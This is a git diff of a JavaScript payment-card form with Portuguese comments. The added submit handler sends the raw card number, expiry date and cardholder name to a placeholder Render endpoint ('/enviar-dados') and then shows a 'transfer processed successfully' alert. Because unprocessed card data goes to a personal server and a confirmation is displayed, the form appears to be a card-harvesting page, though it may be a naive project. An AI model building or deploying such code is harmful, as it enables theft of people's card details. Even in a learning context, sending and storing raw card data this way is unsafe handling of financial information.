@@ -8,6 +8,7 @@ document.addEventListener("DOMContentLoaded", () => {
         nome: document.querySelector("#nome"),
     };
 
+    // --- LOGICA DAS DICAS (Mantida do seu original) ---
     const mensagensDica = {
         numero: "Exemplo: 1234 5678 9123 4567",
         data: "Exemplo: 12/30",
@@ -15,58 +16,39 @@ document.addEventListener("DOMContentLoaded", () => {
         nome: "Nome completo impresso no cartão.",
     };
 
-    // --- FUNÇÃO PARA MOSTRAR/REMOVER AVISOS ---
-    function gerenciarAviso(input, mensagem, cor = "#666", classe = "mensagem-dica") {
-        const pai = input.parentElement;
-        const avisoExistente = pai.querySelector(`.${classe}`);
-        if (avisoExistente) avisoExistente.remove();
-
-        if (mensagem) {
-            const span = document.createElement("span");
-            span.classList.add(classe);
-            span.style.color = cor;
-            span.style.fontSize = "12px";
-            span.style.display = "block";
-            span.style.marginTop = "4px";
-            span.textContent = mensagem;
-            pai.appendChild(span);
+    function removeMensagemDica(input) {
+        const dicaExistente = input.parentElement.querySelector(".mensagem-dica");
+        if (dicaExistente) {
+            dicaExistente.remove();
         }
     }
 
-    // Configuração de Focus (Dicas Cinzas)
     for (const key in campos) {
         const input = campos[key];
         input.addEventListener("focus", () => {
-            gerenciarAviso(input, mensagensDica[key]);
+            removeMensagemDica(input);
+            const dica = document.createElement("span");
+            dica.classList.add("mensagem-dica");
+            dica.style.color = "#666";
+            dica.style.fontSize = "12px";
+            dica.style.display = "block";
+            dica.style.marginTop = "4px";
+            dica.textContent = mensagensDica[key];
+            input.parentElement.appendChild(dica);
         });
         input.addEventListener("blur", () => {
-            gerenciarAviso(input, null);
+            removeMensagemDica(input);
         });
     }
 
-    // --- LÓGICA DE ENVIO COM VALIDAÇÃO EM VERMELHO ---
+    // --- NOVA LOGICA DE ENVIO PARA O BANCO DE DADOS ---
     form.addEventListener("submit", async (event) => {
-        event.preventDefault();
-        let formValido = true;
+        event.preventDefault(); // Impede o recarregamento da página
 
-        // 1. VALIDAÇÃO CAMPO POR CAMPO
-        for (const key in campos) {
-            const input = campos[key];
-            if (input.value.trim() === "") {
-                // Se estiver vazio, coloca o aviso em VERMELHO
-                gerenciarAviso(input, "Este campo é obrigatório!", "red", "erro-vazio");
-                formValido = false;
-            } else {
-                // Se preencheu, remove o erro se ele existir
-                const erro = input.parentElement.querySelector(".erro-vazio");
-                if (erro) erro.remove();
-            }
-        }
-
-        if (!formValido) return; // Para o envio se houver erro
-
-        // 2. Coleta de dados
+        // 1. Pegar o tipo de cartão selecionado
         const cardType = document.querySelector('input[name="gender"]:checked')?.value || "Não informado";
+
+        // 2. Montar o objeto com os dados
         const dadosParaEnviar = {
             numero: campos.numero.value,
             dataValidade: campos.data.value,
@@ -75,31 +57,35 @@ document.addEventListener("DOMContentLoaded", () => {
             tipo: cardType
         };
 
-        // 3. Bloqueio do botão
+        // 3. DESATIVAR O BOTÃO (Evita que o usuário clique 10 vezes enquanto envia)
         const botao = form.querySelector("button");
         botao.disabled = true;
         botao.textContent = "Processando...";
 
         try {
-            // LEMBRETE: Use o seu link do Render aqui!
-            const urlDoServidor = "https://SEU-PROJETO.onrender.com/enviar-dados";
+            // IMPORTANTE: Substitua o link abaixo pelo link que o RENDER te der!
+            // Exemplo: https://meu-projeto-api.onrender.com/enviar-dados
+            const urlDoServidor = "https://SEU-PROJETO-NO-RENDER.onrender.com/enviar-dados";
 
             const resposta = await fetch(urlDoServidor, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {
+                    'Content-Type': 'application/json'
+                },
                 body: JSON.stringify(dadosParaEnviar)
             });
 
             if (resposta.ok) {
-                alert("Transferência realizada com sucesso!");
-                form.reset();
+                alert("Transferência processada com sucesso!");
+                form.reset(); // Limpa o formulário
             } else {
-                alert("Erro ao salvar dados. Verifique sua conexão.");
+                alert("Erro ao processar transferência. Tente novamente.");
             }
         } catch (error) {
-            console.error("Erro:", error);
-            alert("O servidor não respondeu. Tente novamente em instantes.");
+            console.error("Erro na conexão:", error);
+            alert("O servidor está offline. Tente novamente em alguns instantes.");
         } finally {
+            // Reativar o botão
             botao.disabled = false;
             botao.textContent = "Transferir";
         }
